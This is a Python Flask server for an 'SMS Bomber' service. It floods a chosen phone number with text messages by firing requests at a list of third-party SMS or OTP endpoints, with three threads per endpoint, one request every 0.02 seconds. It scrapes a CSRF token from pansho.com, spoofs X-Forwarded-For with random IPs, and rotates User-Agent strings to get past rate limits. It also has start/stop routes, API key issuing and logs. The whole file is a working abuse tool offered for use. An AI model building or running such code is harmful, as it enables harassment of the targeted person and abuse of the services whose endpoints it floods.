from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime
from bs4 import BeautifulSoup

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'requests/stats.json'
KEYS_FILE = 'requests/keys.json'
LOGS_FILE = 'requests/logs.json'

# ===== LOAD DATA =====
def load_requests():
    try:
        with open(REQUESTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_stats(data):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def load_stats():
    try:
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}

def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_keys(data):
    try:
        with open(KEYS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def load_logs():
    try:
        with open(LOGS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_logs(data):
    try:
        with open(LOGS_FILE, 'w') as f:
            json.dump(data[-100:], f, indent=2)  # Keep last 100
    except:
        pass

# ===== GLOBALS =====
requests_data = load_requests()
stats_data = load_stats()
keys_data = load_keys()
logs_data = load_logs()
bombing_active = False
bombing_threads = []
bombing_lock = threading.Lock()

# ===== PANSHO SESSION =====
def get_pansho_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    try:
        resp = session.get('https://pansho.com/', headers=headers, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token = None
        token_input = soup.find('input', {'name': '_token'})
        if token_input:
            token = token_input.get('value')
        if not token:
            meta = soup.find('meta', {'name': 'csrf-token'})
            if meta:
                token = meta.get('content')
        if not token:
            token = 'DUMMY_TOKEN'
        return session, session.cookies.get_dict(), token
    except Exception as e:
        print(f"❌ Pansho session failed: {e}")
        return None, None, None

# ===== SEND REQUEST =====
def send_request(req, phone):
    try:
        if 'pansho' in req['name'].lower():
            session, cookies, token = get_pansho_session()
            if not session:
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            body = req['body'].replace('{phone}', phone).replace('{token}', token)
            r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
        else:
            session = req_lib.Session()
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            if req['method'] == 'POST':
                if isinstance(req['body'], dict):
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=5)
                else:
                    body = req['body'].replace('{phone}', phone)
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
            else:
                r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=5)
        
        with bombing_lock:
            stats_data['total_requests'] += 1
            if r.status_code in [200, 302, 201, 202]:
                stats_data['success'] += 1
                save_stats(stats_data)
                return True
            elif r.status_code == 429:
                stats_data['rate_limited'] += 1
                save_stats(stats_data)
                return False
            else:
                stats_data['failed'] += 1
                save_stats(stats_data)
                return False
    except Exception as e:
        with bombing_lock:
            stats_data['total_requests'] += 1
            stats_data['failed'] += 1
            save_stats(stats_data)
        return False

# ===== PARALLEL BOMBING WORKER =====
def bombing_worker(phone, req, thread_id):
    global bombing_active
    phone_variants = req.get('phones', [phone])
    if not phone_variants:
        phone_variants = [phone]
    
    while bombing_active:
        target_phone = random.choice(phone_variants)
        success = send_request(req, target_phone)
        
        # Log
        with bombing_lock:
            log_entry = {
                "time": datetime.now().isoformat(),
                "request": req['name'],
                "phone": target_phone,
                "status": "success" if success else "failed",
                "thread": thread_id
            }
            logs_data.append(log_entry)
            save_logs(logs_data)
        
        # Ultra fast: 0.02 sec = 3000 req/min per thread
        time.sleep(0.02)

# ===== ROUTES =====

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data
    })

@app.route('/api/keys', methods=['GET'])
def get_keys():
    return jsonify(keys_data)

@app.route('/api/keys', methods=['POST'])
def generate_key():
    data = request.json
    key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
    keys_data[key] = {
        "created": datetime.now().isoformat(),
        "expiry": data.get('expiry', 3600),
        "name": data.get('name', 'Unnamed')
    }
    save_keys(keys_data)
    return jsonify({"success": True, "key": key})

@app.route('/api/keys/<key>', methods=['DELETE'])
def revoke_key(key):
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        return jsonify({"success": True})
    return jsonify({"success": False}), 404

@app.route('/api/logs', methods=['GET'])
def get_logs():
    return jsonify(logs_data[-50:])  # Last 50 logs

@app.route('/api/bomb/start', methods=['POST'])
def start_bombing():
    global bombing_active, bombing_threads, stats_data
    
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    
    if bombing_active:
        return jsonify({"error": "Bombing already active"}), 400
    
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_stats(stats_data)
    
    bombing_active = True
    bombing_threads = []
    
    active_requests = [r for r in requests_data if r.get('active', True)]
    thread_id = 0
    for req in active_requests:
        # 3 parallel threads per request type for insane speed
        for _ in range(3):
            t = threading.Thread(target=bombing_worker, args=(phone, req, thread_id))
            t.daemon = True
            t.start()
            bombing_threads.append(t)
            thread_id += 1
    
    return jsonify({
        "success": True,
        "message": f"Bombing started on {phone}",
        "phone": phone,
        "active_requests": len(active_requests),
        "threads": len(bombing_threads)
    })

@app.route('/api/bomb/stop', methods=['POST'])
def stop_bombing():
    global bombing_active
    bombing_active = False
    return jsonify({
        "success": True,
        "message": "Bombing stopped",
        "stats": stats_data
    })

@app.route('/api/bomb/status', methods=['GET'])
def bombing_status():
    return jsonify({
        "active": bombing_active,
        "stats": stats_data,
        "active_requests": sum(1 for r in requests_data if r.get('active', True)),
        "threads": len(bombing_threads)
    })

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

app.debug = False
if __name__ == '__main__':
    app.run(debug=True, port=5000)
